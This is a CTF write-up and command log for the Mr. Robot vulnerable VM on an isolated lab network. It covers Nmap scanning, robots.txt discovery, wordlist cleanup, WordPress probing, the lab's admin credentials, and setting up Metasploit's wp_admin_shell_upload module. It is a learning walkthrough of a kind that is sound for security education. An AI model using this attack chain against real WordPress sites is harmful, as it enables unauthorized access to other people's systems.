# Mr. Robot CTF — Pentesting Walkthrough

## Overview

This write-up documents my learning from the Mr. Robot CTF, focusing on the methodology used during reconnaissance, enumeration, exploitation, initial access, and privilege escalation.

> Environment: Authorized CTF/lab environment

---

## Skills Practiced

- Network reconnaissance
- Nmap
- Service enumeration
- Web enumeration
- WordPress enumeration
- Directory discovery
- Credential discovery
- Initial access
- Linux enumeration
- Privilege escalation
- Post-exploitation
- CTF methodology

---

# 1. Reconnaissance

The first step was identifying the target and determining which services were exposed.

### Nmap

I used Nmap to identify open ports and running services.

```bash
nmap -sV <TARGET>

The scan helped identify the available attack surface.

Key lesson

Enumeration should come before exploitation.

Instead of immediately attacking a service, I first tried to understand:

Which ports were open?
Which services were running?
What technologies were being used?
Which services could potentially provide an entry point?
2. Web Enumeration

After identifying the web service, I investigated the web application.

Areas checked included:

Web pages
robots.txt
Hidden directories
Application technologies
WordPress endpoints

The goal was to identify information that could reveal additional attack paths.

3. WordPress Enumeration

The target was identified as using WordPress.

I investigated the WordPress installation and looked for:

Users
Login functionality
Plugins
Themes
Exposed files
Other useful information

This demonstrated why technology identification during enumeration is important.

4. Initial Access

After enumeration, I identified a path that allowed initial access to the target.

The important part of this stage was understanding the chain:

Reconnaissance
      ↓
Enumeration
      ↓
Vulnerability Identification
      ↓
Exploitation
      ↓
Initial Access

The objective was to obtain a shell in the authorized CTF environment.

5. Linux Enumeration

After obtaining access, I enumerated the compromised system.

I investigated:

Current user
User privileges
Running processes
Files
Permissions
Configuration files
Potential privilege-escalation paths

Useful commands included:

whoami
id
uname -a
pwd
ls -la
Key lesson

Getting a shell does not necessarily mean the system is fully compromised.

The next question is:

What privileges does the current user have?

6. Privilege Escalation

The next stage was identifying a method to move from a lower-privileged account toward higher privileges.

Conceptually:

Low Privilege
     ↓
System Enumeration
     ↓
Misconfiguration / Vulnerability
     ↓
Privilege Escalation
     ↓
Higher Privilege

This section helped me understand the importance of system enumeration after initial access.

7. Flags / Keys

The CTF contained multiple keys/flags that were discovered throughout the attack chain.

The important lesson was not simply obtaining the flags, but understanding how each stage of the attack led to the next stage.

8. Attack Chain

The overall attack path can be summarized as:

Reconnaissance
      ↓
Nmap
      ↓
Service Enumeration
      ↓
Web Enumeration
      ↓
WordPress Discovery
      ↓
Initial Access
      ↓
Shell
      ↓
Linux Enumeration
      ↓
Privilege Escalation
      ↓
Flags / Keys
9. What I Learned
Technical
How Nmap contributes to attack-surface discovery
Importance of service enumeration
Web application enumeration
WordPress security testing
Linux enumeration after obtaining access
Privilege escalation methodology
Using Linux commands during CTFs
Thinking about attack chains rather than individual vulnerabilities
Methodology

The biggest lesson was:

Do not blindly run tools or commands. Understand what information each step provides and use that information to determine the next step.

10. Tools Used
Kali Linux
Nmap
Linux command line
Web browser
WordPress enumeration techniques
11. Takeaways

This CTF helped connect individual cybersecurity concepts into a complete penetration-testing workflow:

Recon → Enumeration → Exploitation → Initial Access → Privilege Escalation → Post-Exploitation

The experience also highlighted areas I want to study further:

Linux privilege escalation
Web application security
Active Directory
API security
Reverse engineering




Mr. Robot CTF — Command Log & Explanations

Authorized local lab / CTF environment.

Target used in this write-up: 192.168.56.104

Attacker VM: Kali Linux / Linux Mint

This document records the commands used during the lab, in the order we used them, with a short explanation of what each command does.

1. Identify the target

Check local network interfaces

ip addr

Purpose: Displays network interfaces and IP addresses on the attacker machine.

Our lab network used the VirtualBox Host-only network:

Mint: 192.168.56.101

Kali: 192.168.56.103

Mr. Robot target: 192.168.56.104

2. Initial Nmap scan

sudo nmap 192.168.56.104 -sV -T4 -oA nmap-scan --open

Explanation

sudo — runs Nmap with elevated privileges.

nmap — network/service scanner.

192.168.56.104 — target IP.

-sV — attempts to identify service versions.

-T4 — faster timing profile.

-oA nmap-scan — saves results in Nmap's three major output formats.

--open — displays open ports rather than listing all closed ports.

Important result

80/tcp   open  http
443/tcp  open  ssl/http

This indicated that the target had a web service available.

3. Inspect the web server

curl http://192.168.56.104

Purpose: Sends an HTTP request to the target and prints the returned HTML.

This confirmed that the web server was responding.

4. Check robots.txt

curl http://192.168.56.104/robots.txt

Purpose: Requests the site's robots.txt file.

The target revealed:

fsocity.dic
key-1-of-3.txt

This gave us two interesting paths to investigate.

5. Retrieve the first CTF key

curl http://192.168.56.104/key-1-of-3.txt

Purpose: Requests the first flag/key file from the target.

Keep the value obtained from the target in your private lab notes.

6. Download the discovered dictionary

wget http://192.168.56.104/fsocity.dic

Purpose: Downloads the fsocity.dic wordlist from the target to the attacker machine.

The original file was several MB in size.

7. Remove duplicate entries

sort -u fsocity.dic > fsocity_sorted.txt

Explanation

sort — sorts the contents alphabetically.

-u — removes duplicate lines.

> — writes the result to a new file.

fsocity_sorted.txt — cleaned wordlist.

We then checked the number of entries:

wc -l fsocity.dic fsocity_sorted.txt

The original list contained about 858,160 lines, while the deduplicated list contained about 11,451 lines.

Why this matters: A cleaned wordlist reduces repeated work during later credential-testing steps.

8. Check the WordPress login endpoint

curl -I http://192.168.56.104/wp-login.php

Purpose: Sends an HTTP HEAD request to the WordPress login page.

-I requests only the HTTP headers.

The response confirmed that /wp-login.php was available.

9. Check the WordPress admin endpoint

curl -I http://192.168.56.104/wp-admin/

Purpose: Checks the WordPress administrator path without downloading the complete page.

The server redirected the request toward the WordPress login page, which is expected when authentication is required.

Metasploit Investigation

10. Start Metasploit

msfconsole

Purpose: Opens the Metasploit Framework console.

11. Search for WordPress modules

search wordpress

Purpose: Searches Metasploit's module database for modules containing "wordpress".

This produced many results, so we narrowed the searches.

12. Search for WordPress admin modules

search wp_admin

One relevant result was:

exploit/unix/webapp/wp_admin_shell_upload

Purpose of this module: It is designed to upload a generated WordPress plugin when valid WordPress administrator credentials are available.

13. Search for WordPress username/login enumeration

search wordpress_login_enum

This returned:

auxiliary/scanner/http/wordpress_login_enum

Purpose: Metasploit's WordPress brute-force/user-enumeration utility.

14. Inspect the WordPress login-enumeration module

use auxiliary/scanner/http/wordpress_login_enum

Then:

show options

This displays the configurable parameters of the module.

We configured the target:

set RHOSTS 192.168.56.104

Then attempted:

run

The module reported:

/ does not seem to be WordPress site

Lesson

The target was actually running WordPress, as independently verified through /wp-login.php, but this particular Metasploit module did not recognize the installation correctly. We therefore did not force the module further.

15. Verify WordPress directly

From the Metasploit console, curl can also be executed through the system shell:

curl http://192.168.56.104/wp-login.php

The returned HTML showed the WordPress login form.

The page also identified the installation as WordPress 4.3.1 through its referenced assets.

16. Search for WordPress exploit/admin modules

search type:exploit wordpress admin

This displayed several WordPress-related exploit modules.

The relevant module for our later authenticated stage was:

exploit/unix/webapp/wp_admin_shell_upload

We did not blindly run the other modules because many depend on specific plugins/themes that had not been established on our target.

17. Inspect the admin shell upload module

info exploit/unix/webapp/wp_admin_shell_upload

The module showed these required options:

USERNAME
PASSWORD
RHOSTS
TARGETURI

The description indicated that the module generates a plugin, places a payload inside it, and uploads it to WordPress using valid administrator credentials.

Important learning point

This module requires authentication. Finding the module does not mean it can be used before obtaining valid WordPress credentials.

WordPress Credentials

During the CTF work we established the WordPress credentials:

Username: Elliot
Password: ER28-0652

These credentials can now be used for the authenticated WordPress stage of the lab.

Current Metasploit Stage

The next module we were preparing to configure was:

use exploit/unix/webapp/wp_admin_shell_upload

Then the target-specific settings would be:

set RHOSTS 192.168.56.104
set TARGETURI /
set USERNAME Elliot
set PASSWORD ER28-0652

Before executing anything, check the configuration:

show options

Purpose: Verifies that the target, WordPress path, username, and password are set correctly.

Useful Command Reference

Command

What it does

ip addr

Shows local interfaces/IP addresses

nmap

Scans hosts, ports and services

curl

Makes HTTP requests

wget

Downloads files

sort -u

Sorts and removes duplicate lines

wc -l

Counts lines

msfconsole

Starts Metasploit

search

Searches Metasploit modules

use

Selects a Metasploit module

info

Displays module information

show options

Displays module configuration

set

Sets a module option

run

Executes an auxiliary module

back

Leaves the current Metasploit module

Key Lessons From This Stage

1. Enumerate before exploiting

The workflow was:

Network
   ↓
Nmap
   ↓
Web server
   ↓
robots.txt
   ↓
Wordlist + key
   ↓
WordPress
   ↓
Credential discovery
   ↓
Authenticated WordPress access

2. Don't assume a Metasploit module will work

We found a WordPress enumeration module, but it failed to identify our installation. We verified the service independently instead of assuming the target was wrong.

3. Search results are not proof of vulnerability

A module appearing in:

search type:exploit wordpress

does not mean the target is vulnerable to it. Many WordPress modules require specific plugins, themes, versions, or configurations.

4. Understand module prerequisites

wp_admin_shell_upload requires valid WordPress administrator credentials. That is why credential discovery came before this stage.

Lab Scope

All commands in this document were performed against the intentionally vulnerable Mr. Robot CTF VM on the isolated VirtualBox Host-only network.


IoT and embedded security
Disclaimer

This write-up documents learning performed in an intentionally vulnerable CTF/lab environment. The techniques described should only be used against systems where testing is explicitly authorized
